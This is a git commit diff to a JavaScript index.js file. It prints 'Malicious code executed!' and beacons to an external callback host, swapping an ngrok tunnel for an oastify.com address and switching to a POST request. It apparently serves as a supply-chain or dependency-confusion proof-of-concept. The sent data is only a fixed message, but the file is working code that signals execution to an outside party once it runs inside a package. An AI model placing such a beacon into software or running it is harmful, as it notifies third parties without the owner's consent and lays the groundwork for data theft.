dd7f53392babfd4ea4db60ef44fc8e23bed85fe9
JohnHaland91 <john.haland.91@gmail.com>
2024-06-03 08:02:25 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,43 +1,31 @@
 // index.js
-
 console.log("Malicious code executed!");
 
-// Import the 'http' module
+// Optionally, send a network request to your server for verification
 const http = require('https');
 
-// Define the data to be sent in the HTTP request
 const data = JSON.stringify({ message: 'Malicious code executed!' });
 
-// Configure the options for the HTTP request
 const options = {
-  hostname: 'c073-37-202-73-127.ngrok-free.app',
+  hostname: '9hrw5wd6scu0tydiocu3hoz0zr5itjh8.oastify.com',
   port: 443,
   path: '/log',
-  method: 'GET',
+  method: 'POST',
   headers: {
     'Content-Type': 'application/json',
     'Content-Length': data.length,
   },
 };
 
-// Create an HTTP request object
 const req = http.request(options, (res) => {
-  // Log the status code of the response
-  console.log(`Response status code: ${res.statusCode}`);
-  
-  // Listen for data events on the response (if any)
   res.on('data', (d) => {
-    // Log any data received from the server
-    console.log('Response data:', d.toString());
+    process.stdout.write(d);
   });
 });
 
-// Listen for errors on the request
 req.on('error', (e) => {
-  // Log any errors that occur during the request
-  console.error('Error during HTTP request:', e);
+  console.error(e);
 });
 
-// Write the data to the request body and end the request
 req.write(data);
 req.end();
